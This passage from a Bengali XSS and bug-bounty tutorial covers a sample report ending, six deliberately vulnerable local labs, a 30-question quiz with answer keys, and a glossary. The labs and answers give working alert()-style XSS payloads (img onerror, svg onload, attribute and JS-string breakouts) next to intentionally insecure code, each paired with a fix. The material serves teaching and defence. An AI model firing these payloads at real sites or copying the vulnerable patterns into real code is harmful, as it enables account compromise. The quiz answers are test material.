+  document.cookie দিয়ে session token পড়া সম্ভব (প্রমাণ: সংযুক্ত
+  স্ক্রিনশট, যেখানে শুধুমাত্র নিজের টেস্ট অ্যাকাউন্টের কুকি দেখানো হয়েছে)।
+- কোনো Content-Security-Policy header পাওয়া যায়নি।
+
+পরিবেশ:
+- Browser: Chrome 128 (stable)
+- তারিখ: পরীক্ষার তারিখ
+
+প্রস্তাবিত সমাধান:
+- Review comment আউটপুট করার সময় HTML entity encoding প্রয়োগ করুন।
+- Session cookie-তে HttpOnly ও Secure flag যোগ করুন।
+- একটি nonce-based Content-Security-Policy বিবেচনা করুন।</code></pre>
+  </div>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>উপরের sample report-এ "Impact" সেকশনটি কেন "ধারণা"-ভিত্তিক না হয়ে "প্রমাণ"-ভিত্তিক — নির্দিষ্ট লাইন উদ্ধৃত করে ব্যাখ্যা করুন।</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>একটি দায়িত্বশীল bug bounty workflow-তে scope যাচাই, hypothesis-driven টেস্টিং, reproducible PoC, এবং evidence-based impact assessment অন্তর্ভুক্ত থাকে। রিপোর্ট সবসময় স্পষ্ট, পুনরুৎপাদনযোগ্য এবং পেশাদার হওয়া উচিত — এবং duplicate/informative ফলাফলকে স্বাভাবিক অংশ হিসেবে গ্রহণ করা উচিত।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>Scope যাচাই না করে টেস্টিং শুরু করলে কী ঝুঁকি তৈরি হতে পারে?</li>
+      <li>একটি ভালো PoC-তে কী কী অন্তর্ভুক্ত থাকা উচিত?</li>
+      <li>"Informative"/"Duplicate" ফলাফল পাওয়া কি ব্যর্থতা? ব্যাখ্যা করুন।</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter11"><span>পূর্ববর্তী</span>অধ্যায় ১১</a>
+    <a class="next" href="/chapter13"><span>পরবর্তী</span>অধ্যায় ১৩ — হ্যান্ডস-অন ল্যাব</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 13 — Hands-on Vulnerable Lab
+========================================================= -->
+<section class="chapter" id="chapter13">
+  <div class="eyebrow">অধ্যায় ১৩ · প্র্যাকটিক্যাল</div>
+  <h1>Hands-on Vulnerable Lab</h1>
+  <p class="sub">ছয়টি local-only lab scenario — vulnerable কোড, hint, এবং step-by-step সমাধান সহ। সব lab সম্পূর্ণভাবে একটি local, controlled পরিবেশের জন্য ডিজাইন করা।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> নিচের সব কোড নিজের কম্পিউটারে, local-only পরিবেশে (যেমন <code>localhost</code>) চালানোর জন্য। এই কোড কখনো কোনো পাবলিক সার্ভারে deploy করবেন না — এগুলো ইচ্ছাকৃতভাবে vulnerable।</p></div>
+
+  <h2>Lab ১ — Reflected XSS (HTML Context)</h2>
+  <div class="codeblock"><div class="cb-head"><span>vulnerable-search.html</span><button class="copy-btn">কপি</button></div><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;body&gt;
+&lt;h2&gt;সার্চ ফলাফল&lt;/h2&gt;
+&lt;div id="result"&gt;&lt;/div&gt;
+&lt;script&gt;
+  const params = new URLSearchParams(location.search);
+  const q = params.get('q') || '';
+  document.getElementById('result').innerHTML = 'আপনি খুঁজেছেন: ' + q;
+&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre></div>
+  <details><summary>Hint</summary><div class="inner"><p>Sink-টি কী? এটি কি HTML text context নাকি অন্য কিছু?</p></div></details>
+  <details><summary>Step-by-step সমাধান</summary><div class="inner">
+    <p>এটি একটি DOM-based reflected XSS — <code>q</code> parameter সরাসরি <code>innerHTML</code>-এ বসছে, HTML text context-এ। Payload: <code>?q=&lt;img src=x onerror=alert(1)&gt;</code>। <strong>Fix:</strong> <code>innerHTML</code>-এর বদলে <code>textContent</code> ব্যবহার করুন।</p>
+  </div></details>
+
+  <h2>Lab ২ — Stored XSS</h2>
+  <div class="codeblock"><div class="cb-head"><span>vulnerable-guestbook (ধারণাগত Node/Express)</span><button class="copy-btn">কপি</button></div><pre><code>let comments = [];
+app.post('/comment', (req, res) =&gt; {
+  comments.push(req.body.comment); // কোনো sanitization নেই
+  res.redirect('/guestbook');
+});
+app.get('/guestbook', (req, res) =&gt; {
+  const html = comments.map(c =&gt; `&lt;p&gt;${c}&lt;/p&gt;`).join('');
+  res.send(`&lt;h2&gt;গেস্টবুক&lt;/h2&gt;${html}`);
+});</code></pre></div>
+  <details><summary>Hint</summary><div class="inner"><p>Comment কোথায় সংরক্ষিত হচ্ছে, এবং কোথায় সেটি output হচ্ছে — দুটো আলাদা request খেয়াল করুন।</p></div></details>
+  <details><summary>Step-by-step সমাধান</summary><div class="inner">
+    <p><code>comment=&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> জমা দিলে, প্রতিটি পরবর্তী ভিজিটরের জন্য তা execute হবে। <strong>Fix:</strong> output করার সময় <code>escapeHtml(c)</code> দিয়ে encode করুন (template string-এর বদলে Jinja2/EJS-এর মতো auto-escaping engine ব্যবহার করাও একটি বিকল্প)।</p>
+  </div></details>
+
+  <h2>Lab ৩ — DOM XSS</h2>
+  <div class="codeblock"><div class="cb-head"><span>vulnerable-hash.html</span><button class="copy-btn">কপি</button></div><pre><code>&lt;div id="welcome"&gt;&lt;/div&gt;
+&lt;script&gt;
+  function updateGreeting() {
+    const name = decodeURIComponent(location.hash.slice(1)) || 'অতিথি';
+    document.getElementById('welcome').innerHTML = 'স্বাগতম, ' + name;
+  }
+  window.addEventListener('hashchange', updateGreeting);
+  updateGreeting();
+&lt;/script&gt;</code></pre></div>
+  <details><summary>Hint</summary><div class="inner"><p>Source কোথায়? সার্ভার কি এই ডেটা কখনো দেখে?</p></div></details>
+  <details><summary>Step-by-step সমাধান</summary><div class="inner">
+    <p>URL-এ <code>#&lt;img src=x onerror=alert(1)&gt;</code> যোগ করলে execute হবে — সার্ভার এই hash অংশ কখনোই দেখে না। <strong>Fix:</strong> <code>innerHTML</code>-এর বদলে <code>textContent</code> ব্যবহার করুন।</p>
+  </div></details>
+
+  <h2>Lab ৪ — HTML Attribute Context</h2>
+  <div class="codeblock"><div class="cb-head"><span>vulnerable-profile.html (সার্ভার-সাইড টেমপ্লেট, ধারণাগত)</span><button class="copy-btn">কপি</button></div><pre><code>&lt;input type="text" id="website" value="{{ userWebsite }}"&gt;
+&lt;!-- userWebsite সরাসরি, কোনো encoding ছাড়া, টেমপ্লেটে বসানো হচ্ছে --&gt;</code></pre></div>
+  <details><summary>Hint</summary><div class="inner"><p>আপনাকে প্রথমে quote-এর বাইরে বের হতে হবে।</p></div></details>
+  <details><summary>Step-by-step সমাধান</summary><div class="inner">
+    <p>Payload: <code>" onmouseover="alert(1)</code> অথবা <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>। <strong>Fix:</strong> attribute-aware HTML encoding (<code>"</code> → <code>&amp;quot;</code>) প্রয়োগ করুন, এবং templating engine-এর ডিফল্ট auto-escape বন্ধ না করুন।</p>
+  </div></details>
+
+  <h2>Lab ৫ — JavaScript String Context</h2>
+  <div class="codeblock"><div class="cb-head"><span>vulnerable-config.html</span><button class="copy-btn">কপি</button></div><pre><code>&lt;script&gt;
+  var userTheme = "{{ themeNameFromServer }}";
+  console.log("Theme loaded:", userTheme);
+&lt;/script&gt;</code></pre></div>
+  <details><summary>Hint</summary><div class="inner"><p>প্রথমে JS string বন্ধ করতে হবে, তারপর statement যোগ।</p></div></details>
+  <details><summary>Step-by-step সমাধান</summary><div class="inner">
+    <p>Payload: <code>";alert(document.domain);//</code>। <strong>Fix:</strong> কখনো সার্ভার-সাইড ডেটা সরাসরি inline <code>&lt;script&gt;</code>-এ string হিসেবে বসাবেন না — এর বদলে একটি <code>data-*</code> HTML attribute (properly encoded) ব্যবহার করে JavaScript দিয়ে সেটি পড়ুন, অথবা <code>JSON.stringify()</code> + সঠিক escaping ব্যবহার করুন।</p>
+  </div></details>
+
+  <h2>Lab ৬ — Sanitization Bypass</h2>
+  <div class="codeblock"><div class="cb-head"><span>vulnerable-sanitizer.js (naive filter)</span><button class="copy-btn">কপি</button></div><pre><code>function naiveSanitize(input) {
+  return input.replace(/&lt;script&gt;/gi, '').replace(/&lt;\/script&gt;/gi, '');
+}
+element.innerHTML = naiveSanitize(userComment);</code></pre></div>
+  <details><summary>Hint</summary><div class="inner"><p>এই ফিল্টার শুধু একটি নির্দিষ্ট ট্যাগ নাম টার্গেট করছে — বিকল্প ট্যাগ বিবেচনা করুন।</p></div></details>
+  <details><summary>Step-by-step সমাধান</summary><div class="inner">
+    <p>Payload: <code>&lt;img src=x onerror=alert(1)&gt;</code> অথবা <code>&lt;svg onload=alert(1)&gt;</code> — filter শুধু <code>&lt;script&gt;</code> টার্গেট করে, তাই এই ট্যাগগুলো untouched থাকে। <strong>Fix:</strong> নিজস্ব regex-ভিত্তিক filter বাদ দিয়ে DOMPurify-এর মতো allowlist-ভিত্তিক, পরীক্ষিত লাইব্রেরি ব্যবহার করুন।</p>
+  </div></details>
+
+  <h2>Root-Cause Analysis — সব Lab-এর সারসংক্ষেপ</h2>
+  <table>
+    <thead><tr><th>Lab</th><th>Root cause</th><th>মূল শিক্ষা</th></tr></thead>
+    <tbody>
+      <tr><td>১ — Reflected</td><td>URL ডেটা সরাসরি innerHTML-এ</td><td>DOM sink নিরাপদ API দিয়ে প্রতিস্থাপন করুন</td></tr>
+      <tr><td>২ — Stored</td><td>সংরক্ষিত ডেটা output-এ encode হয়নি</td><td>Storage-এ না, output-এ encode করুন</td></tr>
+      <tr><td>৩ — DOM</td><td>Hash fragment, সার্ভার কখনো দেখে না</td><td>Client-side code-ও audit প্রয়োজন</td></tr>
+      <tr><td>৪ — Attribute</td><td>Attribute quote encode হয়নি</td><td>Context-নির্দিষ্ট encoding আবশ্যক</td></tr>
+      <tr><td>৫ — JS string</td><td>সার্ভার ডেটা সরাসরি inline script-এ</td><td>Inline script-এ কখনো raw ডেটা বসাবেন না</td></tr>
+      <tr><td>৬ — Sanitizer bypass</td><td>Blocklist-ভিত্তিক naive filter</td><td>সবসময় পরীক্ষিত allowlist লাইব্রেরি ব্যবহার করুন</td></tr>
+    </tbody>
+  </table>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>এই ছয়টি lab একসাথে XSS-এর প্রধান প্যাটার্ন কভার করে — reflected, stored, DOM-based, এবং তিনটি ভিন্ন context (attribute, JS string, sanitizer bypass)। প্রতিটি lab-এর vulnerable কোড ও fix পাশাপাশি পর্যালোচনা করে প্যাটার্ন চেনার দক্ষতা তৈরি হয়।</p>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter12"><span>পূর্ববর্তী</span>অধ্যায় ১২</a>
+    <a class="next" href="/chapter14"><span>পরবর্তী</span>অধ্যায় ১৪ — অনুশীলনী ও মূল্যায়ন</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 14 — Practice Questions and Assessment
+========================================================= -->
+<section class="chapter" id="chapter14">
+  <div class="eyebrow">অধ্যায় ১৪ · মূল্যায়ন</div>
+  <h1>Practice Questions and Assessment</h1>
+  <p class="sub">Beginner থেকে Advanced পর্যন্ত প্রশ্ন, কোড রিভিউ, পেলোড ডিবাগিং এবং scenario-based বাগ বাউন্টি প্রশ্ন — বিস্তারিত answer key-সহ।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> নিচের প্রশ্ন/উত্তরে উল্লেখিত যেকোনো পেলোড বা কৌশল শুধুমাত্র নিজের lab বা অনুমোদিত পরিবেশে প্রয়োগ করুন।</p></div>
+
+  <h2>বিভাগ A — Beginner প্রশ্ন (১–৮)</h2>
+  <ol>
+    <li>XSS-এর পূর্ণরূপ কী এবং এটি কোন ধরনের vulnerability (client-side/server-side)?</li>
+    <li>Source ও sink-এর সংজ্ঞা দিন, একটি করে উদাহরণসহ।</li>
+    <li>Reflected ও Stored XSS-এর মধ্যে প্রধান পার্থক্য কী?</li>
+    <li><code>innerHTML</code> ও <code>textContent</code>-এর মধ্যে নিরাপত্তাগত পার্থক্য কী?</li>
+    <li>Same-Origin Policy থাকা সত্ত্বেও XSS কীভাবে কার্যকর হয়?</li>
+    <li>HTML entity encoding-এ <code>&lt;</code> ও <code>&gt;</code> কীভাবে প্রকাশ করা হয়?</li>
+    <li>DOM-based XSS কেন সার্ভার-সাইড লগে নাও ধরা পড়তে পারে?</li>
+    <li>CSP-এর পূর্ণরূপ কী এবং এটি মূলত কী নিয়ন্ত্রণ করে?</li>
+  </ol>
+
+  <h2>বিভাগ B — Intermediate Code Analysis (৯–১৬)</h2>
+  <p>প্রতিটি কোড স্নিপেট পড়ে বলুন এটি vulnerable কি না, এবং হলে কেন:</p>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ৯</span></div><pre><code>element.textContent = location.hash.slice(1);</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ১০</span></div><pre><code>element.innerHTML = DOMPurify.sanitize(userInput);</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ১১</span></div><pre><code>&lt;div onclick="handleClick('{{ userId }}')"&gt;ক্লিক করুন&lt;/div&gt;</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ১২</span></div><pre><code>&lt;p&gt;{{ comment }}&lt;/p&gt; &lt;!-- Jinja2, ডিফল্ট auto-escape চালু --&gt;</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ১৩</span></div><pre><code>&lt;p&gt;{{ comment | safe }}&lt;/p&gt; &lt;!-- Jinja2, "safe" filter --&gt;</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ১৪</span></div><pre><code>function Comment({text}) { return &lt;div&gt;{text}&lt;/div&gt;; } // React</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ১৫</span></div><pre><code>function Comment({html}) { return &lt;div dangerouslySetInnerHTML={{__html: html}} /&gt;; }</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ১৬</span></div><pre><code>res.send(`&lt;a href="${userUrl}"&gt;লিঙ্ক&lt;/a&gt;`); // userUrl = "javascript:alert(1)" দিলে কী হবে?</code></pre></div>
+
+  <h2>বিভাগ C — Advanced Context Identification (১৭–২০)</h2>
+  <p>নিচের raw response fragment-এ marker-এর অবস্থান দেখে context চিহ্নিত করুন এবং একটি উপযুক্ত payload প্রস্তাব করুন:</p>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ১৭</span></div><pre><code>&lt;script&gt;var cfg = {name: "MARKER"};&lt;/script&gt;</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ১৮</span></div><pre><code>&lt;a href="/profile?ref=MARKER"&gt;প্রোফাইল&lt;/a&gt;</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ১৯</span></div><pre><code>&lt;style&gt;.user-bg { background: url('MARKER'); }&lt;/style&gt;</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ২০</span></div><pre><code>&lt;!-- MARKER --&gt;</code></pre></div>
+
+  <h2>বিভাগ D — Payload Debugging (২১–২৪)</h2>
+  <p>নিচের প্রতিটি পরিস্থিতিতে payload কেন কাজ করছে না তা ব্যাখ্যা করুন:</p>
+  <ol start="21">
+    <li>Payload <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> পাঠানো হয়েছে, response-এ <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code> দেখা যাচ্ছে।</li>
+    <li>Payload <code>&lt;img src=x onerror=alert(1)&gt;</code> response-এ হুবহু দেখা যাচ্ছে, কিন্তু কোনো alert আসছে না; Console-এ "Refused to execute inline event handler" লেখা একটি error আছে।</li>
+    <li>Payload attribute context-এর জন্য তৈরি (<code>" onmouseover=alert(1) x="</code>), কিন্তু response-এ দেখা যাচ্ছে input আসলে একটি JS string context-এ বসছে।</li>
+    <li>Time-based blind payload (<code>SLEEP(5)</code>-সদৃশ ধারণা, XSS প্রসঙ্গে নয়) ব্যবহারের বদলে XSS-এ blind payload পাঠানো হয়েছে কিন্তু collector-এ কোনো notification আসেনি তিন ঘণ্টা পরেও।</li>
+  </ol>
+
+  <h2>বিভাগ E — Vulnerable Code Review ও Remediation (২৫–২৭)</h2>
+  <p>নিচের কোড পর্যালোচনা করে vulnerability চিহ্নিত করুন এবং একটি সুনির্দিষ্ট fix প্রস্তাব করুন (কোডসহ):</p>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ২৫</span></div><pre><code>app.get('/search', (req, res) =&gt; {
+  res.send(`&lt;p&gt;ফলাফল: ${req.query.q}&lt;/p&gt;`);
+});</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ২৬</span></div><pre><code>window.addEventListener('message', (e) =&gt; {
+  document.getElementById('box').innerHTML = e.data;
+});</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>প্রশ্ন ২৭</span></div><pre><code>function sanitize(s) { return s.replace(/&lt;script&gt;/g, ''); }</code></pre></div>
+
+  <h2>বিভাগ F — Scenario-Based Bug Bounty প্রশ্ন (২৮–৩০)</h2>
+  <ol start="28">
+    <li>আপনি একটি reflected XSS পেয়েছেন, কিন্তু এটি শুধুমাত্র সেই ইউজারের নিজের অ্যাকাউন্টের একটি সেটিং পেজে কাজ করে, এবং ইউজারকে নিজেই নিজের বিরুদ্ধে payload পাঠাতে হবে (কোনো শেয়ারযোগ্য লিঙ্ক তৈরি সম্ভব না)। এটি কি রিপোর্টযোগ্য? যুক্তি দিন।</li>
+    <li>আপনি একটি stored XSS পেয়েছেন support ticket ফিচারে, যা শুধুমাত্র admin দেখেন। আপনার কাছে admin অ্যাক্সেস নেই। কীভাবে, নৈতিকভাবে ও নিরাপদে, এই finding-এর impact প্রমাণ করবেন?</li>
+    <li>একটি প্রোগ্রাম বলছে "self-XSS out of scope"। আপনি একটি XSS পেয়েছেন যা টেকনিক্যালি self-XSS-এর মতো দেখতে, কিন্তু আপনি দেখিয়েছেন একটি CSRF-এর সাথে চেইন করে এটি অন্য ভিকটিমের উপরেও প্রয়োগ করা সম্ভব। এটি কীভাবে রিপোর্ট করবেন?</li>
+  </ol>
+
+  <h2>Answer Key — বিভাগ A (সংক্ষিপ্ত)</h2>
+  <details><summary>উত্তর ১–৮ দেখুন</summary><div class="inner">
+    <ol>
+      <li>Cross-Site Scripting; এটি মূলত একটি client-side vulnerability (ব্রাউজারে execute হয়)।</li>
+      <li>Source = attacker-controlled ডেটা প্রবেশের বিন্দু (যেমন URL parameter); Sink = যেখানে সেই ডেটা বিপজ্জনকভাবে ব্যবহৃত হয় (যেমন <code>innerHTML</code>)।</li>
+      <li>Reflected: single request/response-এ, persist করে না। Stored: database/storage-এ সংরক্ষিত, একাধিক ভিকটিমকে প্রভাবিত করে।</li>
+      <li><code>innerHTML</code> স্ট্রিংকে HTML হিসেবে পার্স করে (বিপজ্জনক); <code>textContent</code> plain text হিসেবে বসায় (নিরাপদ)।</li>
+      <li>Attacker-এর script, ভিকটিমের ব্রাউজারে, target সাইটের নিজস্ব origin থেকেই execute হয় — তাই SOP সেটিকে "সাইটেরই কোড" হিসেবে গণ্য করে।</li>
+      <li><code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>।</li>
+      <li>কারণ hash fragment (<code>#...</code>) কখনো সার্ভারে পাঠানো হয় না — শুধু client-side JS সেটি পড়ে।</li>
+      <li>Content-Security-Policy; এটি নিয়ন্ত্রণ করে কোন উৎস থেকে script/style/resource লোড করা অনুমোদিত।</li>
+    </ol>
+  </div></details>
+
+  <h2>Answer Key — বিভাগ B (কোড বিশ্লেষণ)</h2>
+  <details><summary>উত্তর ৯–১৬ দেখুন</summary><div class="inner">
+    <ol start="9">
+      <li>নিরাপদ — <code>textContent</code> কখনো HTML পার্স করে না।</li>
+      <li>নিরাপদ (যদি DOMPurify সঠিকভাবে configured ও up-to-date থাকে) — এটিই রেকমেন্ডেড প্যাটার্ন।</li>
+      <li>Vulnerable — userId যদি quote ভাঙতে পারে (<code>'</code>), inline event handler-এর মধ্যে arbitrary JS যোগ করা সম্ভব।</li>
+      <li>নিরাপদ — Jinja2-এর ডিফল্ট auto-escape সক্রিয়।</li>
+      <li>Vulnerable — <code>| safe</code> filter auto-escape বন্ধ করে দেয়।</li>
+      <li>নিরাপদ — JSX টেক্সট ইন্টারপোলেশন ডিফল্টভাবে auto-escaped।</li>
+      <li>Vulnerable — <code>dangerouslySetInnerHTML</code> রaw HTML সরাসরি বসায়, কোনো sanitization উল্লেখ নেই।</li>
+      <li>Vulnerable — <code>javascript:</code> স্কিম filter না হলে href ক্লিক করলে script execute হবে; এছাড়া <code>"</code> encode না হলে attribute breakout-ও সম্ভব।</li>
+    </ol>
+  </div></details>
+
+  <h2>Answer Key — বিভাগ C (Context Identification)</h2>
+  <details><summary>উত্তর ১৭–২০ দেখুন</summary><div class="inner">
+    <ol start="17">
+      <li>JS string context (object property-এর মান)। Payload: <code>"}};alert(1);var x={a:{b:"</code> বা সরলীকৃত: <code>"};alert(1);//</code></li>
+      <li>URL/attribute-এর অংশবিশেষ। যদি পুরো URL-ই reflect হয় (query param নয়), <code>javascript:alert(1)</code> চেষ্টা করা যায়; যদি শুধু query value হয়, সাধারণত কম এক্সপ্লয়টেবল, attribute breakout চেষ্টা করুন।</li>
+      <li>CSS context। আধুনিক ব্রাউজারে সরাসরি JS execution কঠিন; এটি data exfiltration (যেমন CSS দিয়ে পরোক্ষভাবে তথ্য বের করা) বা পুরনো ব্রাউজার-নির্দিষ্ট ঝুঁকি হিসেবে বিবেচিত হতে পারে।</li>
+      <li>HTML comment context। Payload: <code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</code></li>
+    </ol>
+  </div></details>
+
+  <h2>Answer Key — বিভাগ D (Payload Debugging)</h2>
+  <details><summary>উত্তর ২১–২৪ দেখুন</summary><div class="inner">
+    <ol start="21">
+      <li>Output সঠিকভাবে HTML-encode হচ্ছে — এই নির্দিষ্ট context নিরাপদ; ভিন্ন context/parameter-এ চেষ্টা করুন।</li>
+      <li>একটি CSP নীতি inline event handler ব্লক করছে (<code>unsafe-inline</code> নেই) — বিকল্প হিসেবে কোনো nonce/hash-allowed script সোর্স bypass সম্ভব কি না বিশ্লেষণ করুন, অথবা নোট করুন যে CSP কার্যকরভাবে protect করছে।</li>
+      <li>Context ভুলভাবে ধরা হয়েছে — raw response আবার দেখে প্রকৃত surrounding syntax (JS string) অনুযায়ী payload পুনর্গঠন করুন (<code>";alert(1);//</code>)।</li>
+      <li>সম্ভাব্য কারণ: payload সেই ডেটা দেখার মতো কোনো admin/এজেন্ট এখনও দেখেননি (সময় লাগতে পারে), collector নিজে ঠিকভাবে কনফিগার হয়নি, অথবা payload আদৌ সেই storage sink পর্যন্ত পৌঁছায়নি — ধৈর্য ধরুন ও collector সেটআপ যাচাই করুন।</li>
+    </ol>
+  </div></details>
+
+  <h2>Answer Key — বিভাগ E (Remediation)</h2>
+  <details><summary>উত্তর ২৫–২৭ দেখুন</summary><div class="inner">
+    <p><strong>২৫:</strong> Reflected XSS, HTML text context। Fix: <code>escapeHtml(req.query.q)</code> দিয়ে encode করুন অথবা auto-escaping templating engine ব্যবহার করুন।</p>
+    <p><strong>২৬:</strong> DOM-based XSS, কোনো origin check নেই এবং <code>innerHTML</code> ব্যবহৃত হচ্ছে। Fix: <code>if (e.origin !== 'https://trusted.example') return;</code> যোগ করুন এবং <code>innerHTML</code>-এর বদলে <code>textContent</code> ব্যবহার করুন।</p>
+    <p><strong>২৭:</strong> Naive blocklist, নেস্টেড ট্যাগ ও বিকল্প ভেক্টর (<code>&lt;img onerror&gt;</code>) দিয়ে bypass সম্ভব। Fix: DOMPurify-এর মতো allowlist-ভিত্তিক লাইব্রেরি দিয়ে প্রতিস্থাপন করুন।</p>
+  </div></details>
+
+  <h2>Answer Key — বিভাগ F (Scenario-Based)</h2>
+  <details><summary>উত্তর ২৮–৩০ দেখুন</summary><div class="inner">
+    <p><strong>২৮:</strong> সাধারণত কম-গুরুত্বপূর্ণ/self-XSS হিসেবে বিবেচিত হয়, কারণ বাস্তবসম্মত কোনো attack scenario নেই (ভিকটিমকে নিজের বিরুদ্ধেই payload চালাতে হবে, এবং শেয়ারযোগ্য নয়)। অনেক প্রোগ্রাম এটি Informative হিসেবে বন্ধ করবে — তবুও রিপোর্ট করা উচিত, সততার সাথে এর সীমাবদ্ধতা উল্লেখ করে।</p>
+    <p><strong>২৯:</strong> নিজের admin অ্যাক্সেস না থাকলে, impact "প্রমাণ" করার চেষ্টা না করে, শুধুমাত্র root cause (sanitization অনুপস্থিত), data flow, এবং সাধারণ জ্ঞান (admin panel কীভাবে কাজ করে তার ডকুমেন্টেশন/API থেকে) ভিত্তিক একটি যুক্তিসঙ্গত impact assessment লিখুন — কখনো admin অ্যাকাউন্টে অননুমোদিতভাবে প্রবেশের চেষ্টা করবেন না।</p>
+    <p><strong>৩০:</strong> সততার সাথে পুরো চেইন (CSRF + self-XSS) ব্যাখ্যা করে রিপোর্ট করুন, এবং স্পষ্টভাবে দেখান কেন এই কম্বিনেশন প্রোগ্রামের "self-XSS out of scope" নীতির বাইরে পড়ে (কারণ attacker এখন অন্য ভিকটিমকেও প্রভাবিত করতে পারছেন তাদের অজান্তেই)।</p>
+  </div></details>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>এই অধ্যায়ের ৩০টি প্রশ্ন (৮টি conceptual, ৮টি code analysis, ৪টি context identification, ৪টি payload debugging, ৩টি remediation, ৩টি scenario-based) পুরো ডকুমেন্টেশনের মূল ধারণাগুলো পুনরাবৃত্তি ও প্রয়োগ করার সুযোগ দেয়। Answer key-সহ প্রতিটি উত্তর যাচাই করে নিজের বোঝাপড়া মূল্যায়ন করুন।</p>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter13"><span>পূর্ববর্তী</span>অধ্যায় ১৩</a>
+    <a class="next" href="/chapter15"><span>পরবর্তী</span>অধ্যায় ১৫ — শব্দকোষ ও চিট শিট</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 15 — Glossary, Cheat Sheet and FAQ
+========================================================= -->
+<section class="chapter" id="chapter15">
+  <div class="eyebrow">অধ্যায় ১৫ · রেফারেন্স</div>
+  <h1>Glossary, Cheat Sheet and FAQ</h1>
+  <p class="sub">গুরুত্বপূর্ণ টার্মিনোলজি, সোর্স/সিঙ্ক রেফারেন্স, চেকলিস্ট, সাধারণ ভুল এবং ৩০+ বিস্তারিত FAQ — পুরো ডকুমেন্টেশনের দ্রুত রেফারেন্স।</p>
+
+  <h2>গুরুত্বপূর্ণ XSS Terminology</h2>
+  <table>
+    <thead><tr><th>টার্ম</th><th>সংজ্ঞা</th></tr></thead>
+    <tbody>
+      <tr><td>XSS</td><td>Cross-Site Scripting — attacker-controlled script ভিকটিমের ব্রাউজারে execute হওয়া</td></tr>
+      <tr><td>Source</td><td>Attacker-controlled ডেটা প্রবেশের বিন্দু</td></tr>
+      <tr><td>Sink</td><td>যেখানে ডেটা বিপজ্জনকভাবে ব্যবহৃত হয় (code execution সক্ষম)</td></tr>
+      <tr><td>Reflected XSS</td><td>একটি request/response-এ, persist না করে ঘটা XSS</td></tr>
+      <tr><td>Stored XSS</td><td>Database/storage-এ সংরক্ষিত, একাধিক ভিকটিমকে প্রভাবিতকারী XSS</td></tr>
+      <tr><td>DOM-based XSS</td><td>সম্পূর্ণ client-side, সার্ভার অজান্তে ঘটা XSS</td></tr>
+      <tr><td>Blind XSS</td><td>Attacker নিজে দেখতে পান না এমন জায়গায় persist হওয়া XSS</td></tr>
+      <tr><td>Mutation XSS (mXSS)</td><td>Sanitizer parse/serialize আচরণের ফাঁক কাজে লাগানো XSS</td></tr>
+      <tr><td>Self-XSS</td><td>শুধুমাত্র ভিকটিমের নিজের অ্যাকাউন্টে কার্যকর, সাধারণত কম-গুরুত্বপূর্ণ</td></tr>
+      <tr><td>Output encoding</td><td>আউটপুটের সময়, context অনুযায়ী বিশেষ ক্যারেক্টার রূপান্তর</td></tr>
+      <tr><td>Sanitization</td><td>Rich input থেকে বিপজ্জনক অংশ অপসারণ/নিরপেক্ষকরণ</td></tr>
+      <tr><td>CSP</td><td>Content-Security-Policy — কোন উৎস থেকে রিসোর্স লোড অনুমোদিত তা নিয়ন্ত্রণকারী হেডার</td></tr>
+      <tr><td>Trusted Types</td><td>DOM sink-কে raw string গ্রহণ থেকে বিরত রাখা ব্রাউজার API</td></tr>
+      <tr><td>DOM clobbering</td><td>HTML element দিয়ে global JS variable ওভাররাইড করা কৌশল</td></tr>
+      <tr><td>Polyglot payload</td><td>একাধিক context-এ কার্যকর হওয়ার জন্য ডিজাইন করা payload</td></tr>
+      <tr><td>HttpOnly</td><td>Cookie flag যা JavaScript দিয়ে cookie পড়া প্রতিরোধ করে</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Common Sources and Sinks — রেফারেন্স টেবিল</h2>
+  <div class="grid2">
+    <div class="card"><h4>সাধারণ Source</h4><ul>
+      <li><code>location.href</code> / <code>location.hash</code> / <code>location.search</code></li>
+      <li><code>document.referrer</code></li>
+      <li><code>document.URL</code></li>
+      <li><code>window.name</code></li>
+      <li>URL parameter, form field, cookie, HTTP header (সার্ভার-সাইড)</li>
